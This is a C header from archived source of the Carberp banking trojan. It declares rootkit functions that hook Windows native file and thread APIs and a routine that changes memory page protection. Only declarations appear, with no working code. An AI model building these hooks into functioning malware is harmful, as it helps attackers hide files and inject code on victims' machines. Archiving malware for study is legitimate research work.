/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#ifndef RootkitH
#define RootkitH
//----------------------------------------------------------------------------

void HookZwQueryDirectoryFile();
void HookZwResumeThread();
void HookZwOpenFile();
void HookZwCreateFile();

VOID NTAPI RootkitThread(	PVOID NormalContext , PVOID SystemArgument1 ,  PVOID SystemArgument2  );


void ProtectPage( LPVOID lpAddr, DWORD dwParams );

//----------------------------------------------------------------------------
#endif
